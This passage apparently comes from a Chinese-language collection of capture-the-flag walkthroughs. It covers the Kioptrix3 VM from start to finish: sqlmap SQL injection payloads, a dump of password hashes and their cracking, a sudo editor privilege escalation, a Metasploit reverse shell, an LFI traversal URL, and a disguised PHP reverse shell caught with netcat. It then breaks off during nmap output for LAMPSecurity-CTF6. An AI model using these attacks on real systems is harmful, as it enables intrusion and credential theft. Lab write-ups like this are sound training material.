    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (5293=5293) THEN 1 ELSE (SELECT 1341 UNION SELECT 9380) END))&sort=photoid

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(1324,2762)>(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(1324=1324,1))),0x7170786a71,FLOOR(RAND(0)*2))x FROM (SELECT 8520 UNION SELECT 1582 UNION SELECT 8916 UNION SELECT 1258)a GROUP BY x)&sort=photoid

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 4741 FROM (SELECT(SLEEP(5)))vtbf)&sort=photoid

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x7171766a71,0x4d67454a425a6e796b5745656b794f584a4348714c79624d4255416243444967494975507875524d,0x7170786a71),NULL,NULL,NULL,NULL,NULL-- TpfQ&sort=photoid

Parameter: sort (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1&sort=photoid AND (SELECT 4185 FROM (SELECT(SLEEP(5)))Gmzf)
---
there were multiple injection points, please select the one to use for following injections:
[0] place: GET, parameter: id, type: Unescaped numeric (default)
[1] place: GET, parameter: sort, type: Unescaped numeric
[q] Quit
[04:18:18] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[04:18:18] [INFO] fetching columns for table 'dev_accounts' in database 'gallery'
[04:18:18] [INFO] used SQL query returns 3 entries
[04:18:19] [INFO] used SQL query returns 3 entries                                                    
[04:18:19] [INFO] retrieved: 'id'
[04:18:19] [INFO] retrieved: 'int(10)'
[04:18:19] [INFO] retrieved: 'username'
[04:18:19] [INFO] retrieved: 'varchar(50)'
[04:18:19] [INFO] retrieved: 'password'
[04:18:19] [INFO] retrieved: 'varchar(50)'
[04:18:19] [INFO] fetching entries for table 'dev_accounts' in database 'gallery'
[04:18:19] [INFO] used SQL query returns 2 entries
[04:18:19] [INFO] retrieved: '1','0d3eccfb887aabd50f243b3f155c0f85','dreg'
[04:18:19] [WARNING] automatically patching output having last char trimmed
[04:18:19] [INFO] retrieved: '2','5badcaf789d3d1d09794d8f021f40f0e','loneferret'
[04:18:19] [INFO] recognized possible password hashes in column 'password'                            
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[04:18:22] [INFO] writing hashes to a temporary file '/tmp/sqlmapa2cskfzq12456/sqlmaphashes-0oyz7rlz.txt'                                                                                                     
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[04:18:28] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[04:18:31] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] y
[04:18:34] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[04:18:34] [INFO] starting 4 processes 
[04:18:39] [INFO] cracked password 'starwars' for user 'loneferret'                                   
[04:18:40] [INFO] cracked password 'Mast3r' for user 'dreg'                                           
Database: gallery                                                                                     
Table: dev_accounts
[2 entries]
+----+---------------------------------------------+------------+
| id | password                                    | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+

[04:18:42] [INFO] table 'gallery.dev_accounts' dumped to CSV file '/root/.sqlmap/output/kioptrix3.com/dump/gallery/dev_accounts.csv'                                                                          
[04:18:42] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times
[04:18:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/kioptrix3.com'

[*] ending @ 04:18:42 /2019-12-13/
```
直接用sqlmap跑出账号密码，还省去了将hash拿去解密的麻烦。之后使用这两个密码直接连接ssh即可。

#### 权限提升

ssh连接

``` bash
root@kali:~# ssh loneferret@192.168.84.144
loneferret@192.168.84.144's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ id
uid=1000(loneferret) gid=100(users) groups=100(users)
loneferret@Kioptrix3:~$ pwd
/home/loneferret
loneferret@Kioptrix3:~$ whoami
loneferret
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

可以看到当前登录的用户具有xterm-256color文本编辑器的sudo权限。 最初，我们可以尝试编辑/etc/sudoers文件，以便提升特权-为此，我们就开始吧！
如果由于某种原因在尝试运行sudo ht时出现错误，则只需像下面所做的那样将xtrem-color导出为TERM。

``` bash
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers 
Error opening terminal: xterm-256color.
loneferret@Kioptrix3:~$ export TERM=xterm-color
loneferret@Kioptrix3:~$ sudo ht /etc/sudoers
```

可以看到这样打开sudoers文件。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub49.jpg)

从这里按F3，然后输入/etc/sudoers,回车,再下图中的位置输入[, /bin/sh]，然后F10选择yes然后保存。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub50.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub51.jpg)

输入下面命令，成功由普通用户变为root用户

``` bash
loneferret@Kioptrix3:~$ sudo /bin/sh
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/loneferret
# cd /root
# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com


Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/


Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```

至此挑战完成。

#### 更多方法

 - 利用LotusCMS 3.0 eval（）远程命令执行漏洞

使用msf中的exploit/multi/http/lcms_php_exec模块可以直接getshell

``` bash
root@kali:~# msfdb run
[+] Starting database
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *


       =[ metasploit v5.0.63-dev                          ]
+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/http/lcms_php_exec
msf5 exploit(multi/http/lcms_php_exec) > set RHOSTS 192.168.84.144
RHOSTS => 192.168.84.144
msf5 exploit(multi/http/lcms_php_exec) > set payload generic/shell_reverse_tcp                                                                                                                                                             
payload => generic/shell_reverse_tcp                                                                                                                                                                                                       
msf5 exploit(multi/http/lcms_php_exec) > set LHOST 192.168.84.135
LHOST => 192.168.84.135                                                                                                                                                                                                                    
msf5 exploit(multi/http/lcms_php_exec) > set URI /                                                                                                                                                                                         
URI => /

msf5 exploit(multi/http/lcms_php_exec) > exploit 

[*] Started reverse TCP handler on 192.168.84.135:4444 
[*] Using found page param: /index.php?page=index
[*] Sending exploit ...
[*] Command shell session 2 opened (192.168.84.135:4444 -> 192.168.84.144:57666) at 2019-12-14 06:18:03 -0500

whoami
www-data
```

成功getshell

``` bash
ls -la gallery/
total 164
drwxr-xr-x 7 root root  4096 Apr 14  2011 .
drwxr-xr-x 8 root root  4096 Apr 15  2011 ..
drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
```

在gallery目录下发现phpmyadmin配置文件中的phpmyadmin的用户名和密码

``` bash
cat gallery/gconfig.php
<?php
        error_reporting(0);
        /*
                A sample Gallarific configuration file. You should edit
                the installer details below and save this file as gconfig.php
                Do not modify anything else if you don't know what it is.
        */

        // Installer Details -----------------------------------------------

        // Enter the full HTTP path to your Gallarific folder below,
        // such as http://www.yoursite.com/gallery
        // Do NOT include a trailing forward slash

        $GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

        $GLOBALS["gallarific_mysql_server"] = "localhost";
        $GLOBALS["gallarific_mysql_database"] = "gallery";
        $GLOBALS["gallarific_mysql_username"] = "root";
        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";

        // Setting Details -------------------------------------------------

if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
                echo("A connection to the database couldn't be established: " . mysql_error());
                die();
}else {
        if(!$g_mysql_d = @mysql_select_db($GLOBALS["gallarific_mysql_database"], $g_mysql_c)) {
                echo("The Gallarific database couldn't be opened: " . mysql_error());
                die();
        }else {
                $settings=mysql_query("select * from gallarific_settings");
                if(mysql_num_rows($settings)!=0){
                        while($data=mysql_fetch_array($settings)){
                                $GLOBALS["{$data['settings_name']}"]=$data['settings_value'];
                        }
                }

        }
}

?>
```

发现phpmyadmin的用户名密码：root/fuckeyou，直接登录然后getshell

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub52.jpg)

具体参考：[phpmyadmin getshell](https://www.jianshu.com/p/ddd41b841c36)

 - LFI漏洞组合利用

``` bash
http://192.168.84.144/index.php?system=../../../../../../../etc/passwd%00.html
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub53.jpg)

使用之前的sql注入得到admin的密码下图所示登录

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub54.jpg)

将php reverse shell木马后缀改成.jpg上传，然后右键得到图片的链接

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub55.jpg)

浏览器访问

``` bash
192.168.84.144/index.php?system=../../../../../../../home/www/kioptrix3.com/gallery/photos/x281lo68jw.jpg%00.html
```

同时kali端nc监听成功返回shell

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
connect to [192.168.84.135] from kioptrix3.com [192.168.84.144] 37790
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
 15:10:15 up  2:59,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
loneferr pts/0    192.168.84.135   12:27   21:13m  4.66s  0.01s sshd: loneferre
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/
$ whoami
www-data
$
```
6的一批！！！！！！

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="red">***The end,to be continue...***</font>
<!-- kb:end KVM3 -->

</details>

<a id="case-lampsecurity-ctf6"></a>

## SQL 数据到 udev 进程

页面参数注入连接账户，旧 udev 的提权需要准确 PID 与多次验证。原文中的重试和失败现象一并保留。

<p class="kb-provenance">来源 LAMPSecurity-CTF6 · 原记录 2019-12-16 · 10 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-lampsecurity-ctf6">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start LAMPSecurity-CTF6 -->

名称：LAMPSecurity-CTF6
发布日期：2009年6月29日

下载：

 - Download: [http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/CTF6/lampsecurity_ctf6.zip/download](http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/CTF6/lampsecurity_ctf6.zip/download)
 - Download (Mirror): [https://download.vulnhub.com/lampsecurity/ctf6.zip](https://download.vulnhub.com/lampsecurity/ctf6.zip)
 - Download (Torrent): [https://download.vulnhub.com/lampsecurity/ctf6.zip.torrent](https://download.vulnhub.com/lampsecurity/ctf6.zip.torrent)

描述：

LAMPSecurity项目旨在产生可用于培训信息安全专业人员和测试产品的培训和基准测试工具。 请注意，还有其他捕获flag练习（不仅仅是最新的一种）。 检查SourceForge站点以找到其他可用的练习（http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/）。

通过遵循本文档，可以将这些练习用于培训目的。 另外，您可能希望使用CTF虚拟机作为目标来测试新工具。 这对于评估漏洞发现或渗透测试工具的有效性特别有用。



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.142.0/24
Nmap scan report for 192.168.142.129
Host is up (0.00034s latency).
MAC Address: 00:0C:29:32:79:F3 (VMware)
```

``` bash
root@kali:~# nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.129
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.3: 
|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051
|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924
|       CVE-2014-1692   7.5     https://vulners.com/cve/CVE-2014-1692
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478
|       CVE-2007-4752   7.5     https://vulners.com/cve/CVE-2007-4752
|       CVE-2009-2904   6.9     https://vulners.com/cve/CVE-2009-2904
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107
|       CVE-2008-4109   5.0     https://vulners.com/cve/CVE-2008-4109
|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243
|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755
|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814
|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000
|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327
|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259
80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.142.129
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.142.129:80/mail/
|     Form id: rcmlogintz
|     Form action: ./
|     
|     Path: http://192.168.142.129:80/?action=login
|     Form id: 
|     Form action: ?action=login
|     
|     Path: http://192.168.142.129:80/mail/?_task=mail
|     Form id: rcmlogintz
|     Form action: ./
|     
|     Path: http://192.168.142.129:80/mail/
|     Form id: rcmlogintz
|_    Form action: ./
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /mail/: Mail folder
|   /logs/: Logs (401 Authorization Required)
|   /phpmyadmin/: phpMyAdmin
|   /css/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /docs/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /files/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /lib/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|   /manual/: Potentially interesting folder
|   /sql/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|_  /templates/: Potentially interesting directory w/ listing on 'apache/2.2.3 (centos)'
|_http-server-header: Apache/2.2.3 (CentOS)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.142.129:80/mail/program/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.129:80/mail/program/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.142.129:80/mail/program/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|_    http://192.168.142.129:80/mail/program/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
110/tcp  open  pop3       Dovecot pop3d
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
| sslv2-drown: 
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|   vulns: 
|     CVE-2016-0800: 
|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)
|       state: VULNERABLE
|       ids: 
|         CVE:CVE-2016-0800
|       description: 
|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and
|       other products, requires a server to send a ServerVerify message before establishing
|       that a client possesses certain plaintext RSA data, which makes it easier for remote
|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding
|       oracle, aka a "DROWN" attack.
|     
|       refs: 
|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800
|_        https://www.openssl.org/news/secadv/20160301.txt
111/tcp  open  rpcbind    2 (RPC #100000)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
143/tcp  open  imap       Dovecot imapd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://www.securityfocus.com/bid/70574
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
443/tcp  open  ssl/https?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: mod_ssl 2.2.x/1024-bit MODP group with safe prime modulus
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
